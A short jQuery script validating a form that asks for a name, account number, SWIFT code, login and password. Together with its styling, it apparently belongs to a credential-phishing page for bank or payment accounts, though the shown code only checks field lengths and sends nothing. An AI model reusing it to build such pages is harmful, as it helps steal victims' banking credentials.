$(document).ready(function() {
  $("#btnConfirm").click(function() {
    var xName = $("#Name").val();
    var xNumber = $("#Number").val();
    var xSwift = $("#Swift").val();
    var xLogin = $("#Login").val();
    var xPass = $("#Pass").val();
    var xStart;

    if (xName === "" || xName.length < 4) {
      xStart = false;
      document.getElementById("DivName").className = "textInput lap hasError";
    }
    if (xNumber === "" || xNumber.length < 4) {
      xStart = false;
      document.getElementById("DivNumber").className = "textInput lap hasError";
    }
    if (xSwift === "" || xSwift.length < 4) {
      xStart = false;
      document.getElementById("DivSwift").className = "textInput lap hasError";
    }
    if (xLogin === "" || xLogin.length < 4) {
      xStart = false;
      document.getElementById("DivLogin").className = "textInput lap hasError";
    }
    if (xPass === "" || xPass.length < 4) {
      xStart = false;
      document.getElementById("DivPass").className = "textInput lap hasError";
    }
    if (xStart === false) {
      return false;
    } else {
      document.getElementById("loading").className = "hasSpinner";
    }

  })
  $("#Name").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivName").className = "textInput lap";
    } else {
      document.getElementById("DivName").className = "textInput lap hasError";
    }
  })
  $("#Number").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivNumber").className = "textInput lap";
    } else {
      document.getElementById("DivNumber").className = "textInput lap hasError";
    }
  })
  $("#Swift").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivSwift").className = "textInput lap";
    } else {
      document.getElementById("DivSwift").className = "textInput lap hasError";
    }
  })
  $("#Login").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivLogin").className = "textInput lap";
    } else {
      document.getElementById("DivLogin").className = "textInput lap hasError";
    }
  })
  $("#Pass").keyup(function() {
    if ($(this).val().length !== "") {
      document.getElementById("DivPass").className = "textInput lap";
    } else {
      document.getElementById("DivPass").className = "textInput lap hasError";
    }
  })
})
